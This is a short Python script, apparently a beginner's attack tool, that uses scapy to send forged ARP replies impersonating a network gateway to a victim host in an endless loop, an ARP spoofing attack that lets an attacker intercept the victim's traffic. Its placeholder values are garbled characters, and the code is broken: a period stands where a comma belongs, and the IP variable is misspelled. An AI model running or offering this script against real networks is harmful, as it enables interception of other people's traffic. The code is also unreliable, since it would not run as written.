from scapy.all import *
import whois
import time
def main():
    getwayIP="[����IP]"
    vicitmIP="[Ŀ��IP]"
    hackMAC="[�ڿ͵�����]"
    victimMAC="[Ŀ�������]"
    #print(getmacbyip("[ip]")) ������������������
    packet=Ether()/ARP(psrc=getwayIP.pdst=victimIP)
    while 1:
        sendp(packet)
        time.sleep(2)
        print(packet.show())
    pass
if __name__ == '__main__':
    main()